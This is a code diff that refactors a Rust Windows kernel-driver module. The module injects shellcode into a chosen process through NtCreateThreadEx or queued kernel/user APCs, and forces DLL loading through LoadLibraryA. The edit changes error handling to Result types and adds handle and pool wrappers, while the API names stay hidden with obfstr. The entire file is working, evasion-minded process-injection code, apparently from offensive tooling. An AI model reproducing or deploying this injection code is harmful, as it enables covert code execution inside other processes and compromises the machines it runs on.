@@ -1,28 +1,27 @@
 #![allow(non_snake_case)]
 
 use {
-    crate::{
-        includes::{
-            enums::KAPC_ENVIROMENT::OriginalApcEnvironment, types::{
-                ZwCreateThreadExType, PKNORMAL_ROUTINE
-            }, KeInitializeApc, KeInsertQueueApc, MmCopyVirtualMemory,ZwProtectVirtualMemory
-        }, 
-        process::Process, 
-        utils::{
-            find_thread_alertable, find_zw_function, 
-            get_module_peb, read_file, InitializeObjectAttributes
-        } 
-    }, 
+    obfstr::obfstr,
+    shared::structs::TargetInjection, 
     callbacks::{kernel_apc_callback, user_apc_callback}, 
     core::{ffi::c_void, mem::{size_of, transmute}, ptr::null_mut}, 
-    obfstr::obfstr, 
-    shared::structs::TargetInjection, 
     wdk_sys::{
         ntddk::{
-            ExAllocatePool2, IoGetCurrentProcess, ZwAllocateVirtualMemory, 
+            IoGetCurrentProcess, ZwAllocateVirtualMemory, 
             ZwClose, ZwOpenProcess
         },
         _MODE::{KernelMode, UserMode}, *
+    },
+    crate::{
+        includes::{
+            enums::KAPC_ENVIROMENT::OriginalApcEnvironment, 
+            types::{ZwCreateThreadExType, PKNORMAL_ROUTINE}, 
+            KeInitializeApc, KeInsertQueueApc, MmCopyVirtualMemory, ZwProtectVirtualMemory
+        }, 
+        process::Process, 
+        utils::{
+            find_thread_alertable, get_module_peb, handles::Handle, patterns::find_zw_function, pool::PoolMemory, read_file, InitializeObjectAttributes
+        } 
     },
 };
 
@@ -41,19 +40,12 @@ impl InjectionShellcode {
     /// # Return
     /// - `NTSTATUS`: A status code indicating success or failure of the operation.
     ///
-    pub unsafe fn injection_thread(target: *mut TargetInjection) -> NTSTATUS {
+    pub unsafe fn injection_thread(target: *mut TargetInjection) -> Result<(), NTSTATUS> {
         let pid = (*target).pid;
         let path = &(*target).path;
         
-        let zw_thread_addr = match find_zw_function(obfstr!("NtCreateThreadEx")) {
-            Some(addr) => addr as *mut c_void,
-            None => return STATUS_UNSUCCESSFUL
-        };
-
-        let target_eprocess = match Process::new(pid) {
-            Some(e_process) => e_process,
-            None => return STATUS_UNSUCCESSFUL,
-        };
+        let zw_thread_addr = find_zw_function(obfstr!("NtCreateThreadEx")).ok_or(STATUS_UNSUCCESSFUL)? as *mut c_void;
+        let target_eprocess = Process::new(pid).ok_or(STATUS_UNSUCCESSFUL)?;
 
         let mut h_process: HANDLE = null_mut();
         let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
@@ -64,21 +56,18 @@ impl InjectionShellcode {
         let mut status = ZwOpenProcess(&mut h_process, PROCESS_ALL_ACCESS, &mut obj_attr, &mut client_id);
         if !NT_SUCCESS(status) {
             log::error!("ZwOpenProcess Failed With Status: {status}");
-            return status;
+            return Err(status);
         }
 
-        let shellcode = match read_file(path) {
-            Ok(buffer) => buffer,
-            Err(error) => return error
-        };
-
-        let mut base_address = null_mut();
+        let h_process = Handle::new(h_process);
+        
+        let shellcode = read_file(path)?;
         let mut region_size = shellcode.len() as u64;
-        status = ZwAllocateVirtualMemory(h_process, &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        let mut base_address = null_mut();
+        status = ZwAllocateVirtualMemory(h_process.get(), &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if !NT_SUCCESS(status) {
             log::error!("ZwAllocateVirtualMemory Failed With Status: {status}");
-            ZwClose(h_process);
-            return status;
+            return Err(status);
         }
 
         let mut result_number = 0;
@@ -93,11 +82,10 @@ impl InjectionShellcode {
         );
         
         let mut old_protect = 0;
-        status = ZwProtectVirtualMemory(h_process, &mut base_address, &mut region_size, PAGE_EXECUTE_READ, &mut old_protect);
+        status = ZwProtectVirtualMemory(h_process.get(), &mut base_address, &mut region_size, PAGE_EXECUTE_READ, &mut old_protect);
         if !NT_SUCCESS(status) {
             log::error!("ZwProtectVirtualMemory Failed With Status: {status}");
-            ZwClose(h_process);
-            return status;
+            return Err(status);
         }
 
         let ZwCreateThreadEx = transmute::<_, ZwCreateThreadExType>(zw_thread_addr);
@@ -107,7 +95,7 @@ impl InjectionShellcode {
             &mut h_thread,
             THREAD_ALL_ACCESS,
             &mut obj_attr,
-            h_process,
+            h_process.get(),
             transmute(base_address),
             null_mut(),
             0,
@@ -118,14 +106,12 @@ impl InjectionShellcode {
         );
         if !NT_SUCCESS(status) {
             log::error!("ZwCreateThreadEx Failed With Status: {status}");
-            ZwClose(h_process);
-            return status;
+            return Err(status);
         }
 
-        ZwClose(h_process);
         ZwClose(h_thread);
 
-        STATUS_SUCCESS
+        Ok(())
     }
 
     /// Injection Shellcode in APC.
@@ -136,42 +122,32 @@ impl InjectionShellcode {
     /// # Return
     /// - `NTSTATUS`: A status code indicating success or failure of the operation.
     ///
-    pub unsafe fn injection_apc(target: *mut TargetInjection) -> NTSTATUS {
+    pub unsafe fn injection_apc(target: *mut TargetInjection) -> Result<(), NTSTATUS> {
         let pid = (*target).pid;
         let path = &(*target).path;
-        let shellcode = match read_file(path) {
-            Ok(buffer) => buffer,
-            Err(error) => return error
-        };
-        
-        let thread_id = match find_thread_alertable(pid) {
-            Some(tid) => tid,
-            None => return STATUS_UNSUCCESSFUL
-        };
+        let shellcode = read_file(path)?;
+        let thread_id = find_thread_alertable(pid).ok_or(STATUS_UNSUCCESSFUL)?;
+        let target_eprocess = Process::new(pid).ok_or(STATUS_UNSUCCESSFUL)?;
 
-        let target_eprocess = match Process::new(pid) {
-            Some(e_process) => e_process,
-            None => return STATUS_UNSUCCESSFUL,
-        };
         let mut h_process: HANDLE = null_mut();
         let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
         let mut client_id = CLIENT_ID {
             UniqueProcess: pid as _,
             UniqueThread: null_mut(),
         };
-
         let mut status = ZwOpenProcess(&mut h_process, PROCESS_ALL_ACCESS, &mut obj_attr, &mut client_id);
         if !NT_SUCCESS(status) {
             log::error!("ZwOpenProcess Failed With Status: {status}");
-            return status;
+            return Err(status);
         }
 
+        let h_process = Handle::new(h_process);
         let mut base_address = null_mut();
         let mut region_size = shellcode.len() as u64;
-        status = ZwAllocateVirtualMemory(h_process, &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        status = ZwAllocateVirtualMemory(h_process.get(), &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
         if !NT_SUCCESS(status) {
             log::error!("ZwAllocateVirtualMemory Failed With Status: {status}");
-            return status;
+            return Err(status);
         }
 
         let mut result_number = 0;
@@ -185,17 +161,19 @@ impl InjectionShellcode {
             &mut result_number,
         );
 
-        let user_apc = ExAllocatePool2(POOL_FLAG_NON_PAGED, size_of::<KAPC>() as u64, u32::from_be_bytes(*b"krts")) as *mut KAPC;
-        if user_apc.is_null() {
-            log::error!("ExAllocatePool2 (User) Failed");
-            return STATUS_UNSUCCESSFUL;
-        }
+        let user_apc = PoolMemory::new(POOL_FLAG_NON_PAGED, size_of::<KAPC>() as u64, u32::from_be_bytes(*b"krts"))
+            .map(|mem| mem.ptr as *mut KAPC)
+            .ok_or_else(|| {
+                log::error!("PoolMemory (User) Failed");
+                STATUS_UNSUCCESSFUL
+            })?;
 
-        let kernel_apc = ExAllocatePool2(POOL_FLAG_NON_PAGED, size_of::<KAPC>() as u64, u32::from_be_bytes(*b"urds")) as *mut KAPC;
-        if kernel_apc.is_null() {
-            log::error!("ExAllocatePool2 (Kernel) Failed");
-            return STATUS_UNSUCCESSFUL;
-        }
+        let kernel_apc = PoolMemory::new(POOL_FLAG_NON_PAGED, size_of::<KAPC>() as u64, u32::from_be_bytes(*b"urds"))
+            .map(|mem| mem.ptr as *mut KAPC)
+            .ok_or_else(|| {
+                log::error!("PoolMemory (Kernel) Failed");
+                STATUS_UNSUCCESSFUL
+            })?;
 
         KeInitializeApc(
             kernel_apc, 
@@ -221,15 +199,15 @@ impl InjectionShellcode {
 
         if !KeInsertQueueApc(user_apc, null_mut(), null_mut(), 0) {
             log::error!("KeInsertQueueApc (User) Failed");
-            return STATUS_UNSUCCESSFUL;
+            return Err(STATUS_UNSUCCESSFUL);
         }
 
         if !KeInsertQueueApc(kernel_apc, null_mut(), null_mut(), 0) {
             log::error!("KeInsertQueueApc (Kernel) Failed");
-            return STATUS_UNSUCCESSFUL;
+            return Err(STATUS_UNSUCCESSFUL);
         }
 
-        STATUS_SUCCESS
+        Ok(())
     }
 }
 
@@ -245,25 +223,13 @@ impl InjectionDLL {
     /// # Return
     /// - `NTSTATUS`: A status code indicating success or failure of the operation.
     ///
-    pub unsafe fn injection_dll_thread(target: *mut TargetInjection) -> NTSTATUS {
+    pub unsafe fn injection_dll_thread(target: *mut TargetInjection) -> Result<(), NTSTATUS> {
         let pid = (*target).pid;
         let path = (*target).path.as_bytes();
+        let zw_thread_addr = find_zw_function(obfstr!("NtCreateThreadEx")).ok_or(STATUS_UNSUCCESSFUL)?;
+        let function_address = get_module_peb(pid, obfstr!("kernel32.dll"),obfstr!("LoadLibraryA")).ok_or(STATUS_UNSUCCESSFUL)?;
+        let target_eprocess = Process::new(pid).ok_or(STATUS_UNSUCCESSFUL)?;
         
-        let zw_thread_addr = match find_zw_function(obfstr!("NtCreateThreadEx")) {
-            Some(addr) => addr as *mut c_void,
-            None => return STATUS_UNSUCCESSFUL
-        };
-
-        let function_address = match get_module_peb(pid, obfstr!("kernel32.dll"),obfstr!("LoadLibraryA")) {
-            Some(addr) => addr,
-            None => return STATUS_UNSUCCESSFUL
-        };
-
-        let target_eprocess = match Process::new(pid) {
-            Some(e_process) => e_process,
-            None => return STATUS_UNSUCCESSFUL,
-        };
-
         let mut h_process: HANDLE = null_mut();
         let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
         let mut client_id = CLIENT_ID {
@@ -273,16 +239,17 @@ impl InjectionDLL {
         let mut status = ZwOpenProcess(&mut h_process, PROCESS_ALL_ACCESS, &mut obj_attr, &mut client_id);
         if !NT_SUCCESS(status) {
             log::error!("ZwOpenProcess Failed With Status: {status}");
-            return status;
+            return Err(status);
         }
+
+        let h_process = Handle::new(h_process);
 
         let mut base_address = null_mut();
         let mut region_size = (path.len() * size_of::<u16>()) as u64;
-        status = ZwAllocateVirtualMemory(h_process, &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        status = ZwAllocateVirtualMemory(h_process.get(), &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if !NT_SUCCESS(status) {
             log::error!("ZwAllocateVirtualMemory Failed With Status: {status}");
-            ZwClose(h_process);
-            return status;
+            return Err(status);
         }
 
         let mut result_number = 0;
@@ -297,11 +264,10 @@ impl InjectionDLL {
         );
 
         let mut old_protect = 0;
-        status = ZwProtectVirtualMemory(h_process, &mut base_address, &mut region_size, PAGE_EXECUTE_READ, &mut old_protect);
+        status = ZwProtectVirtualMemory(h_process.get(), &mut base_address, &mut region_size, PAGE_EXECUTE_READ, &mut old_protect);
         if !NT_SUCCESS(status) {
             log::error!("ZwProtectVirtualMemory Failed With Status: {status}");
-            ZwClose(h_process);
-            return status;
+            return Err(status);
         }
 
         let ZwCreateThreadEx = transmute::<_, ZwCreateThreadExType>(zw_thread_addr);
@@ -311,7 +277,7 @@ impl InjectionDLL {
             &mut h_thread,
             THREAD_ALL_ACCESS,
             &mut obj_attr,
-            h_process,
+            h_process.get(),
             transmute(function_address),
             base_address,
             0,
@@ -322,13 +288,11 @@ impl InjectionDLL {
         );
         if !NT_SUCCESS(status) {
             log::error!("ZwCreateThreadEx Failed With Status: {status}");
-            ZwClose(h_process);
-            return status;
+            return Err(status);
         }
 
-        ZwClose(h_process);
         ZwClose(h_thread);
 
-        STATUS_SUCCESS
+        Ok(())
     }
 }
